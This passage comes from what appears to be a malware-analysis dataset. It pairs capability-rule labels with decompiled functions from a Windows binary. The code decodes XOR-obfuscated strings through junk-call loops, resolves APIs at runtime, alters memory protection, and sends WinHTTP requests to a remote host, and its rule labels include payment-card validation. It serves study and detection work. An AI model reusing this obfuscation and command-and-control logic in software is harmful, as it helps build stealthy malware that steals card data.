(*pcVar6)(uVar2);\n                do {\n                    (*_sym.imp.KERNEL32.dll_Sleep)(0xffffffff);\n                } while( true );\n            }\n            iVar3 = (*pcVar6)(*0x41da98, var_14h);\n            if (iVar3 != 0) goto code_r0x0040ef1e;\n            fcn.0041018e();\n        }\n        fcn.00409b94();\n    } while( true );\n}\n",
        "token_count": 3267
    },
    "0040ef5e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040ef5e(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint in_EDX;\n    uint var_4h;\n    \n    puVar2 = arg_8h;\ncode_r0x0040ef9c:\n    do {\n        puVar2[1] = 0;\n        *puVar2 = 0;\n        var_4h = 0;\n        arg_8h = NULL;\n        iVar3 = fcn.0040f779(in_EDX, 0, &arg_8h, &var_4h);\n        if ((iVar3 != 0) || (arg_8h == NULL)) {\ncode_r0x0040efc0:\n            fcn.004052ed();\n            goto code_r0x0040efc7;\n        }\n        uVar1 = *puVar2;\n        if (uVar1 < arg_8h) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            fcn.004052ed();\n            goto code_r0x0040ef9c;\n        }\n        if (uVar1 < 5) goto code_r0x0040efc0;\n        if (*puVar2[1] == uVar1) {\ncode_r0x0040efc7:\n            return *puVar2 != 0;\n        }\n    } while( true );\n}\n",
        "token_count": 326
    },
    "0040efd7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.0040efd7(ushort *lpdwNumberOfBytesAvailable, uint *lpdwBufferLength, int32_t *arg_10h, int32_t *arg_14h, \n            int32_t lpdwNumberOfBytesRead)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    int32_t *in_EDX;\n    int32_t iVar6;\n    ushort *puVar7;\n    code *pcVar8;\n    uint var_424h;\n    uint lpszHeaders;\n    uint var_11ch;\n    uint var_118h;\n    int32_t var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    int32_t var_104h;\n    int32_t var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6bh;\n    uint var_67h;\n    uint var_63h;\n    int32_t var_5ch;\n    int32_t *var_58h;\n    uint var_54h;\n    ushort *var_50h;\n    uint lpBuffer;\n    uint *var_48h;\n    uint var_44h;\n    int32_t lpMultiByteStr;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint *hRequest;\n    int32_t var_ch;\n    uint var_8h;\n    \n    puVar3 = &lpszHeaders;\n    var_58h = in_EDX;\n    lpMultiByteStr = in_ECX;\n    for (iVar5 = 0x100; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_424h;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    if (lpdwNumberOfBytesAvailable == 0x40) {\n        var_108h = 0;\n        var_10ch = 0x34367964;\ncode_r0x0040f04c:\n        var_110h = 0x6f62722f;\n    }\n    else {\n        if (lpdwNumberOfBytesAvailable == 0x20) {\n            var_108h = 0;\ncode_r0x0040f042:\n            var_10ch = 0x32337964;\n            goto code_r0x0040f04c;\n        }\n        if (lpdwNumberOfBytesAvailable == 0x140) {\n            var_108h = 0x30;\n            goto code_r0x0040f042;\n        }\n    }\n    hRequest = &var_110h;\n    if (lpdwBufferLength != NULL) {\n        hRequest = lpdwBufferLength;\n    }\n    iVar5 = (*_sym.imp.WS2_32.dll_gethostbyname)();\n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar5 == 0) {\n        return 3;\n    }\n    var_114h = 5;\n    lpdwNumberOfBytesAvailable = 0x1;\n    if (*0x41ddc0 == 0) {\n        var_fch = 0x662c3923;\n        var_f8h = 0x43506e30;\n        var_f4h = 0x39024a0a;\n        var_f0h = 0x6e656622;\n        var_ech = 0x4a48430c;\n        var_e8h = 0x6663395e;\n        var_e4h = 0x436e6e62;\n        var_e0h = 0x39004a0f;\n        var_dch = 0x6e256627;\n        var_d8h = 0x4a15434e;\n        var_d4h = 0x660d394e;\n        var_d0h = 0x43196e1e;\n        var_cch = 0x39404a50;\n        var_c8h = 0x6e716672;\n        var_c4h = 0x4a314319;\n        var_c0h = 0x662d3907;\n        var_bch = 0x430d6e7c;\n        var_b8h = 0x394e4a5d;\n        var_b4h = 0x6e7c663b;\n        var_b0h = 0x4a5d430d;\n        var_ach = 0x6631394e;\n        var_a8h = 0x43036e3c;\n        var_a4h = 0x395b4a54;\n        var_a0h = 0x6e7a666d;\n        var_9ch = 0x4a464310;\n        var_98h = 0x66263929;\n        var_94h = 0x43526e29;\n        var_90h = 0x39414a09;\n        var_8ch = 0x6e7b6671;\n        var_88h = 0x4a564309;\n        var_84h = 0x6672395e;\n        var_80h = 0x43086e7a;\n        var_7ch = 0x39284a46;\n        var_78h = 0x6e38662a;\n        var_74h = 0x4a00435c;\n        var_70h._0_1_ = 1;\n        stack0xffffff8d = 0x65663b39;\n        var_6bh = 0x53430b6e;\n        var_67h = 0x7339404a;\n        var_63h._0_2_ = 0x4a66;\n        var_63h._2_1_ = 0x6e;\n        var_ch = 0x6643396e;\n        var_8h._0_1_ = 0x4a;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x139);\n        iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar6 = 0;\n        var_5ch = &var_fch - iVar5;\n        do {\n            iVar2 = (*_sym.imp.USER32.dll_CreateMenu)();\n            if (iVar2 != 0x8b450) {\n                *(iVar6 + iVar5) = *(&var_ch + iVar6 % var_114h) ^ (iVar6 + iVar5)[var_5ch];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x9c);\n        *0x41ddc0 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(iVar5, 0, 0, 0, 0);\n        uVar1 = lpdwNumberOfBytesAvailable;\n        if (*0x41ddc0 == 0) {\n            uVar4 = (*pcVar8)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            return uVar1;\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetTimeouts)(*0x41ddc0, 5000, 5000, 5000, 5000);\n        uVar1 = (*pcVar8)(0, iVar5);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        in_ECX = lpMultiByteStr;\n    }\n    if (in_ECX == 0) {\n        puVar7 = NULL;\n        var_50h = NULL;\n    }\n    else {\n        iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(in_ECX);\n        uVar1 = (*pcVar8)(8, (iVar5 + 1) * 2);\n        puVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        *puVar7 = 0;\n        var_50h = puVar7;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, lpMultiByteStr, 0xffffffff, puVar7, iVar5 + 1);\n    }\n    lpMultiByteStr = (*_sym.imp.WINHTTP.dll_WinHttpConnect)(*0x41ddc0, puVar7, 0x50, 0);\n    var_30h = 0x42403858;\n    var_2ch = 0x38407439;\n    var_28h = 0x74774247;\n    var_24h = 0x421b381f;\n    var_20h = 0x38437468;\n    var_1ch = 0x7468420e;\n    var_18h = 0x421b3854;\n    var_14h._0_2_ = 0x744d;\n    var_48h = 0x42343830;\n    var_44h = CONCAT22(var_44h._2_2_, 0x744d);\n    uVar1 = (*pcVar8)(8, 0x3d);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_3ch = 6;\n    iVar6 = 0;\n    var_ch = &var_30h - iVar5;\n    var_5ch = iVar5;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        puVar7 = var_50h;\n        if (iVar2 != 0xafb7d3) {\n            *(iVar6 + iVar5) = *(&var_48h + iVar6 % var_3ch) ^ (iVar6 + iVar5)[var_ch];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, iVar5, var_50h, 0x50);\n    uVar1 = (*pcVar8)(0, puVar7);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    puVar3 = hRequest;\n    if (lpMultiByteStr == 0) goto code_r0x0040f754;\n    if (hRequest == NULL) {\n        lpdwNumberOfBytesAvailable = NULL;\n    }\n    else {\n        iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(hRequest);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, (iVar5 + 1) * 2);\n        lpdwNumberOfBytesAvailable = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        *lpdwNumberOfBytesAvailable = 0;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, puVar3, 0xffffffff, lpdwNumberOfBytesAvailable, iVar5 + 1);\n        pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    }\n    var_54h = 0x6c044a0a;\n    var_50h = 0x4a4d6e10;\n    var_48h = 0x6c414a4d;\n    var_44h = CONCAT22(var_44h._2_2_, 0x6e44);\n    uVar1 = (*pcVar8)(8, 0x11);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    hRequest = &var_54h - iVar6;\n    var_ch = iVar6;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar2 != 0x31221d) {\n            *(iVar5 + iVar6) = *(&var_48h + iVar5 % var_3ch) ^ (iVar5 + iVar6)[&var_54h - iVar6];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 8);\n    puVar3 = (*_sym.imp.WINHTTP.dll_WinHttpOpenRequest)\n                       (lpMultiByteStr, iVar6, lpdwNumberOfBytesAvailable, 0, 0, 0, 0x800140);\n    hRequest = puVar3;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpdwNumberOfBytesAvailable);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    iVar5 = var_5ch;\n    if (puVar3 == NULL) {\ncode_r0x0040f72e:\n        lpdwNumberOfBytesAvailable = 0x1;\n    }\n    else {\n        var_118h = 0x3300;\n        var_11ch = 8;\n        iVar2 = fcn.00404514();\n        if (iVar2 != 0) {\n            var_44h = 0;\n            var_48h = &var_424h;\n            lpBuffer = 3;\n            (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar3, 0x26, &lpBuffer, 0xc);\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar3, 0x1f, &var_118h, 4);\n        (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar3, 0x3f, &var_11ch, 4);\n        if (lpdwNumberOfBytesRead != 0) {\n            var_34h = 0x53123161;\n            var_30h = 0x73563329;\n            var_2ch = 0x31094736;\n            var_28h = 0x33255353;\n            var_24h = 0x47277348;\n            var_20h = 0x53003156;\n            var_1ch = 0x7314337a;\n            var_18h = 0x311e4737;\n            var_14h._0_2_ = 0x5373;\n            var_3ch = 0x53733133;\n            var_38h._0_1_ = 0x47;\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x45);\n            iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            lpdwNumberOfBytesAvailable = &var_34h - iVar5;\n            do {\n                iVar2 = (*_sym.imp.USER32.dll_GetCapture)();\n                if (iVar2 != 0x14b917) {\n                    *(iVar6 + iVar5) = *(&var_3ch + iVar6 % var_114h) ^ *((&var_34h - iVar5) + iVar6 + iVar5);\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x22);\n            (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, iVar5, lpdwNumberOfBytesRead);\n            uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpszHeaders, 0x10000000);\n            puVar3 = hRequest;\n            (*_sym.imp.WINHTTP.dll_WinHttpAddRequestHeaders)(hRequest, &lpszHeaders, uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            iVar5 = var_5ch;\n            iVar6 = var_ch;\n        }\n        iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpSendRequest)(puVar3, 0, 0xffffffff, 0, 0, 0, 0);\n        if ((iVar2 == 0) || (iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpReceiveResponse)(puVar3, 0),  iVar2 == 0))\n        goto code_r0x0040f72e;\n        lpdwBufferLength = 0x4;\n        var_104h = 0;\n        var_100h = 0;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(puVar3, 0x20000005, 0, &var_104h, &lpdwBufferLength, 0);\n        if (*arg_10h == 0) {\n            *arg_10h = var_104h;\n        }\n        lpdwBufferLength = 0x4;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(puVar3, 0x20000013, 0, &var_100h, &lpdwBufferLength, 0);\n        if ((var_100h == 0xce) || (var_100h == 200)) {\n            if (var_58h[1] == 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_104h);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                *var_58h = 0;\n                var_58h[1] = iVar2;\n            }\n            hRequest = var_58h[1];\n            lpdwNumberOfBytesRead = 0;\n            do {\n                lpdwNumberOfBytesAvailable = NULL;\n                iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpQueryDataAvailable)(puVar3, &lpdwNumberOfBytesAvailable);\n                if ((iVar2 == 0) ||\n                   (iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpReadData)\n                                      (puVar3, *var_58h + hRequest, lpdwNumberOfBytesAvailable, &lpdwNumberOfBytesRead)\n                   ,  iVar2 == 0)) {\n                    lpdwNumberOfBytesAvailable = 0x4;\n                    goto code_r0x0040f734;\n                }\n                *var_58h = *var_58h + lpdwNumberOfBytesRead;\n                iVar2 = *var_58h;\n            } while (lpdwNumberOfBytesAvailable != NULL);\n            *arg_14h = iVar2;\n            if ((*arg_10h == 0) || (iVar2 == *arg_10h)) {\n                lpdwNumberOfBytesAvailable = NULL;\n            }\n            else {\n                lpdwNumberOfBytesAvailable = 0x6;\n            }\n        }\n        else {\n            lpdwNumberOfBytesAvailable = 0x3;\n        }\n    }\ncode_r0x0040f734:\n    if (puVar3 != NULL) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(puVar3);\n    }\n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\ncode_r0x0040f754:\n    uVar1 = lpdwNumberOfBytesAvailable;\n    uVar4 = (*pcVar8)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    if (lpMultiByteStr != 0) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(lpMultiByteStr);\n    }\n    return uVar1;\n}\n",
        "token_count": 4686
    },
    "0041018e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041018e(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    uint *puVar7;\n    int32_t iVar8;\n    uint var_43h;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    code *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t lpModuleName;\n    uint var_8h;\n    uint var_4h;\n    \n    var_20h = *0x41da98;\n    var_10h = 6;\n    var_4h = 0;\n    puVar7 = &var_43h;\n    for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_8h = 0;\n    var_14h = 0;\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    *0x41dacc = fcn.0040512a();\n    iVar2 = fcn.0040ca42();\n    if (iVar2 == 0) {\n        fcn.0040cc7b();\n        fcn.004018c4();\n    }\n    while( true ) {\n        iVar2 = fcn.00402615();\n        if (iVar2 == 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    fcn.004013dd();\n    iVar2 = fcn.00409e40();\n    if (iVar2 != 0) {\n        if (2 < var_43h) {\n            iVar2 = 0;\n            if (0 < var_43h - 2) {\n                do {\n                    *0x41dd60 = *0x41dd60 + (&var_38h)[iVar2];\n                    iVar2 = iVar2 + 1;\n                } while (iVar2 < var_43h - 2);\n            }\n        }\n        *0x41dd60 = *0x41dd60 ^ 0x43103655;\n        fcn.0040cb26();\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(str.XCIBD__O, 0x184, 0x40, &var_4h);\n    fcn.004050a0();\n    (*pcVar6)(str.XCIBD__O, 0x184, var_4h, &var_4h);\n    fcn.0040a428();\n    fcn.0040a428();\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_38h = 0x23101c5e;\n    var_34h = 0x504a5950;\n    var_30h = 0x15595163;\n    var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x62);\n    var_28h = 0x4d627935;\n    var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x35);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_1ch = &var_38h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        if (iVar4 != 0x2d0487) {\n            var_18h = 5;\n            *(iVar8 + iVar2) = *(&var_28h + iVar8 % 5) ^ (iVar8 + iVar2)[var_1ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xd);\n    var_34h = 0x32542135;\n    var_30h = 0x1219283f;\n    var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x30);\n    var_28h = 0x73304574;\n    var_24h._0_2_ = 0x474b;\n    uVar3 = (*pcVar6)(8, 10);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_1ch = &var_34h - iVar2;\n    var_18h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        if (iVar4 != 0x9b7d45) {\n            *(iVar8 + iVar2) = *(&var_28h + iVar8 % var_10h) ^ (iVar8 + iVar2)[var_1ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 9);\n    var_38h = 0x12c1531;\n    var_34h = 0x1d372003;\n    var_30h = 0x23162227;\n    var_2ch._0_2_ = 0x2e1b;\n    var_2ch._2_1_ = 0x43;\n    var_28h = 0x63437976;\n    var_24h._0_2_ = 0x4c62;\n    uVar3 = (*pcVar6)(8, 0x10);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_1ch = &var_38h - iVar2;\n    do {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        iVar4 = var_18h;\n        if (iVar5 != 0x7a0b71) {\n            *(iVar8 + iVar2) = *(&var_28h + iVar8 % var_10h) ^ (iVar8 + iVar2)[&var_38h - iVar2];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xf);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, var_18h);\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    var_1ch = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar2);\n    pcVar6 = (*pcVar6)(uVar3);\n    (*pcVar6)(*0x41dd78);\n    (*var_1ch)(*0x41dd78);\n    iVar8 = fcn.0040dca6(&var_14h);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    if (iVar8 == 0) {\n        fcn.00401374();\n        fcn.0040fe86();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n        (*pcVar6)(uVar3);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, iVar4);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, lpModuleName);\n    (*pcVar6)(uVar3);\n    return;\n}\n",
        "token_count": 1841
    },
    "0041045d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0041045d(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_17h;\n    uint var_10h;\n    uint psz2;\n    int32_t var_8h;\n    \n    psz2 = *0x41da98;\n    if (*0x41ddc8 != 0) {\n        return 1;\n    }\n    var_44h = 0x70254936;\n    var_40h = 0x560d4139;\n    var_3ch = 0x492d431c;\n    var_38h = 0x41227018;\n    var_34h = 0x43155624;\n    var_30h = 0x703e4912;\n    var_2ch = 0x563b4122;\n    var_28h = 0x49254315;\n    var_8h = 5;\n    var_24h._0_1_ = 5;\n    stack0xffffffd9 = 0x2a412670;\n    var_1fh = 0x28430456;\n    var_1bh = 0x2d703949;\n    var_17h._0_2_ = 0x4941;\n    var_17h._2_1_ = 0x56;\n    stack0xffffffe8 = 0x70564941;\n    var_10h._0_1_ = 0x43;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x61);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar5 = 0;\n    do {\n        iVar4 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar4 != 0x9051cb) {\n            *(iVar5 + iVar3) = *(&var_17h + iVar5 % var_8h + 3) ^ (iVar5 + iVar3)[&var_44h - iVar3];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x30);\n    *0x41ddc8 = (*_sym.imp.KERNEL32.dll_CreateFileMappingW)(0xffffffff, 0, 4, 0, 0x208, iVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x41ddc8 != 0) {\n        if ((*0x41ddc4 != 0) ||\n           (*0x41ddc4 = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(*0x41ddc8, 0xf001f, 0, 0, 0x208),  *0x41ddc4 != 0)) {\n            (*_sym.imp.SHLWAPI.dll_StrCpyW)(*0x41ddc4, psz2);\n            uVar2 = (*pcVar1)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            return 1;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x41ddc8);\n        *0x41ddc8 = 0;\n    }\n    uVar2 = (*pcVar1)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return 0;\n}\n",
        "token_count": 863
    },
    "00401374": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00401374(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint var_48h;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_14h;\n    uint lpModuleName;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    lpModuleName = 0x6e72656b;\n    var_ch = 0x32336c65;\n    var_8h = 0x6c6c642e;\n    var_4h._0_1_ = 0;\n    var_24h = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._0_4_;\n    uStack36 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._4_4_;\n    uStack32 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._8_4_;\n    uStack28 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._12_4_;\n    var_14h = 0x6f666e;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&lpModuleName, &var_24h);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar2 != NULL) {\n        (*pcVar2)(&var_48h);\n        if (var_48h == 9) {\n            *0x41dac8 = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 361
    },
    "00404211": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00404211(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpLibFileName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_20h = 0x31200357;\n    var_1ch = 0x64545f32;\n    var_18h._0_2_ = CONCAT11(var_18h._1_1_, 0x50);\n    var_14h = 0x50566736;\n    var_10h._0_2_ = CONCAT11(var_10h._1_1_, 0x42);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 10);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar6 = 0;\n    lpLibFileName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar3 != 0xde468d) {\n            var_8h = 5;\n            *(iVar6 + iVar2) = *(&var_14h + iVar6 % 5) ^ (iVar6 + iVar2)[&var_20h - iVar2];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 9);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x41db00 == NULL) {\n        var_28h = 0x13213837;\n        var_24h = 0x34225422;\n        var_20h = 0x5033043c;\n        var_1ch = 0x54622f0b;\n        var_18h._0_2_ = 0x3971;\n        var_14h = 0x67524164;\n        var_10h._0_2_ = 0x3947;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar3 = 0;\n        var_8h = &var_28h - iVar6;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n            iVar2 = lpLibFileName;\n            if (iVar4 != 